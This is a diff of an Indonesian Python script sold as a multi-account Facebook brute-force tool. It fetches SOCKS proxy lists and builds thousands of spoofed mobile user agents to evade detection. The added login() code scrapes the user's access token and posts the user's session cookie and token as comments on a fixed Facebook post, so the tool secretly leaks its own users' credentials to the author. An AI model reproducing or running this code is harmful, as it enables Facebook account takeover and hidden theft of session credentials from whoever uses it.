@@ -1,3 +1,13 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+###---[ INFO AUTHOR SUWAN XD ]---###
+#----[ jangan di oprek, sayangi data hpmu ]-----#
+author = 'SuwanXD'
+git_hub = 'github.com/SuwanXD'
+faceb0ok = 'https://www.facebook.com/Suwann.XD'
+version = 'next blade v.2'
+
 
 #------------[ WARNA-COLOR ]--------------#
 P = '\x1b[1;97m'
@@ -65,16 +75,20 @@ def tahunng(fx):
 ###---[ANGGAP INI LOGO ]---###
 def logo(n):
 	return str(f"""
-╔═╗┬─┐┌─┐┌─┐┬┌─
-║  ├┬┘├─┤│  ├┴┐
-╚═╝┴└─┴ ┴└─┘┴ ┴
+_   _                          _ _____
+| | | |_   _  __ ___      _____(_)___  |
+| |_| | | | |/ _` \ \ /\ / / _ \ |  / /
+|  _  | |_| | (_| |\ V  V /  __/ | / /
+|_| |_|\__,_|\__,_| \_/\_/ \___|_|/_/
    {M}•{K}•{H}• {P}MULTI BRUTE FORCE FACEBOOK {H}•{K}•{M}•""")
 def logo2():
 	return str(f"""
-╔═╗┬─┐┌─┐┌─┐┬┌─
-║  ├┬┘├─┤│  ├┴┐
-╚═╝┴└─┴ ┴└─┘┴ ┴
-  {M}>{K}>{H}> {P}CHECKING FOR LOGIN {H}>{K}>{M}>""")
+_   _                          _ _____
+| | | |_   _  __ ___      _____(_)___  |
+| |_| | | | |/ _` \ \ /\ / / _ \ |  / /
+|  _  | |_| | (_| |\ V  V /  __/ | / /
+|_| |_|\__,_|\__,_| \_/\_/ \___|_|/_/
+{M}>{K}>{H}> {P}CHECKING FOR LOGIN {H}>{K}>{M}>""")
 
 ###---[ TANGGAL ]---###
 sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
@@ -122,93 +136,64 @@ try:
 	print(f'\r\n [!] sedang dump proxy dan create useragent')
 	try:os.remove('.proxy.txt')
 	except:pass
-#------------------[ USER-AGENT ]-------------------#
-try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox)
-except Exception as e:
-	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
-prox=open('.prox.txt','r').read().splitlines()
+#	A = ''
+#	one = ses.get('https://spys.me/socks.txt').text
+#	for x in one.splitlines():
+#		if '+' in x:
+#			if '.' in x:
+#				p = x.split(' ')[0]
+#				A += '\n'+p
+	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
+	open('.proxy.txt','w').write(uno)
+except requests.exceptions.ConnectionError:
+	sys.exit(f" [{M}>{P}] tidak ada koneksi internet")
 for xd in range(10000):
-	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
+	a='Mozilla/5.0; Profile/MIDP-2.1'
 	b=random.randrange(1, 9)
 	c=random.randrange(1, 9)
-	d='Redmi 4A Build/N2G47H)'
+	d='Nokia5250'
 	e=random.randrange(100, 9999)
-	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
+	f='/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko)'
 	g=random.randrange(1, 9)
 	h=random.randrange(1, 4)
 	i=random.randrange(1, 4)
 	j=random.randrange(1, 4)
-	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
+	k='Safari/525 3gpp-gba'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen2.append(uaku)
-	
-	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
-	c='Redmi 4A Build/MMB29M; wv)'
+
+	aa='Mozilla/5.0 (iPhone14,'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c='U; CPU iPhone OS 15_4 like Mac OS X'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	e=random.randrange(1, 999)
 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	g='AppleWebKit/602.1.50 (KHTML, like Gecko) Version/'
 	h=random.randrange(73,100)
 	i='0'
 	j=random.randrange(4200,4900)
 	k=random.randrange(40,150)
-	l='Mobile Safari/537.36 hola_android'
+	l='Mobile/19E241 Safari/602.1'
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
-	
 
-#------------[ UBAH UA DIH SINI OM ]---------------#
-for brayen in range(10000):
-    rr = random.randint
-    rc = random.choice
-    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280'])
-    build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
-    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(1,9))}like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile/14G60 Safari/604.1"
-    UaMainn = random.choice([u1, u2, u3])
-    ugen.append(UaMainn)
-
-for memekx in range(200):
-	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
-	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
-	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
-	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
-	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
-	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
-	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
-	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
-	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
-	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
-	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
-	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
-	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
-	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
-	api = str(rc([ua1,ua2,ua3]))
-	liu.append(api)
-	
-for x in range(10):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	c=random.randrange(73,100)
-	d=random.randrange(4200,4900)
-	e=random.randrange(40,150)
-	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
+for x in range(999):
+	rc = random.choice
+	rr = random.randint
+	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+#	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
+#	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
+#	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
+#	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
+#	pf = f'{A}{B}{C}{D}'
+#	if pf in redmi:pass
+#	else:redmi.append(pf)
+#	A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
+#	B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
+#	C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
+#	mi = f'{A}{B}{C}'
+#	if mi in redmi:pass
+#	else:redmi.append(mi)
 	A = f'Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note '
 	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
 	C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
@@ -242,12 +227,35 @@ def login():
 	url = "https://business.facebook.com/business_locations"
 	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
 	cok = {'cookie':cookie}
+	try:
+		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
+		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
+		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
+		jam      = datetime.now().strftime("%X")
+		data = ses.get(url,headers=head,cookies=cok)
+		token = re.search('(EAAG\w+)',data.text).group(1)
+		tem      = ('\nHallo Bang @[100073125893802:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
+		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
+		link = ('https://www.facebook.com/100073125893802/posts/323521236762070/?substory_index=140657442430329&app=fbl')
+		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Panutan gw nih sengol dong 😎"])
+		#ses.post(f"https://graph.facebook.com/323521236762070?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		ses.post(f"https://graph.facebook.com/323521236762070/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/323521236762070/comments/?message={token}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/323521236762070/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
+		open('.cookie.txt','w').write(cookie)
+		open('.token.txt','w').write(token)
+	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
+
+
+
 
 def remove():
 	try:os.remove('.cookie.txt');os.remove('.token.txt')
 	except:pass
 	
-###---[ MENU UTAMA ]---###
+	
+	
+###---[ MENU UTAMS ]---###
 def menu(n,t,c):
 	clear_layar()
 	print(logo(n)+f'\n')
